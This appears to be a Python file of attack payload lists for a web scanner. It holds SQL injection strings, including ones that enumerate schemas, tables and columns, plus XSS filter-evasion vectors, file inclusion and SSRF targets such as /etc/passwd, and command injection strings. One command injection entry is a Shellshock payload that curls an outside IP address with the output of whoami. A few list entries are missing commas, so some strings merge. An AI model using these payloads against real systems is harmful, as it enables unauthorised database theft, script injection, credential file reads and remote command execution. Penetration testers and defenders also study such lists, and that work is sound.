waf_checker = [ " '",
                " AND 1",
                " /**/AND/**/1",
                " AND 1=1",
                " AND 1 LIKE 1",
                " ' AND '1'='1",
                "<img src=x onerror=alert('XSS')>",
                "<img onfoo=f()>",
                "<script>alert('intrusion')</script>"
              ]

Sql_injection = {

    "error_based" : ["'", "')", "';", '"', '")', '";', '`', '`)',
                     '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C"],

    "union_query" : [" UNION ALL SELECT 1,2,3,4",
                     " UNION ALL SELECT 1,2,3,4,5-- ",
                     " UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
                     " UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- ",
                     " AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- ",
                     " UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--",
                     ],

    "boolean_based" : [  " AND 1=0",
                         "' AND '1'='1",
                         "' AND 1=1--",
                         " ' AND 1=1#",
                         " AND 1=1 AND '%'='",
                         " AND 7300=7300 AND 'pKlZ'='pKlZ",
                         " AS INJECTX WHERE 1=1 AND 1=1--",
                         " ORDER BY 2--",
                         " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
                         " %' AND 8310=8310 AND '%'='",
                         " and (select substring(@@version,1,1))='X'",
                         " and (select substring(@@version,3,1))='S'",
                         " AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-",
                         " AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--",
                         " AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",
                         " AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",
                         " AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",
                         " AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--"
                     ]
}



XSS = ["<A/hREf=\"j%0aavas%09cript%0a:%09con%0afirm%0d``\">z",
       "<d3\"<\"/onclick=\"1>[confirm``]\"<\">z",
       "<d3/onmouseenter=[2].find(confirm)>z",
       "<details open ontoggle=confirm()>",
       "<script y=\"><\">/*<script* */prompt()</script",
       "<w=\"/x=\"y>\"/ondblclick=`<`[confir\u006d``]>z",
       "<a href=\"javascript%26colon;alert(1)\">click",
       "<a href=javas&#99;ript:alert(1)>click",
       "<script/\"<a\"/src=data:=\".<a,[8].some(confirm)>",
       "<svg/x=\">\"/onload=confirm()//"]


file_inclusion = ["/etc/hosts",
                  "/etc/shells",
                  "/etc/my.conf",
                  "/etc/ssh/ssh_config",
                  "/etc/httpd/logs/access_log",
                  "/var/www/log/access_log",
                  "/var/www/logs/access_log"]

ssrf = ["https://localhost/",
        "http://127.127.127.127",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://127.1.1.1:80\@@127.2.2.2:80/"
        "http://[::]:80/",
        "http://0000::1:80/",
        "file:///etc/passwd"
        "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>"]


command_injection = ["&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
                     "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
                     ";system('cat%20/etc/passwd')",
                     "||/usr/bin/id|",
                     "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`\"",
                     "cat /etc/hosts",
                     "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"]




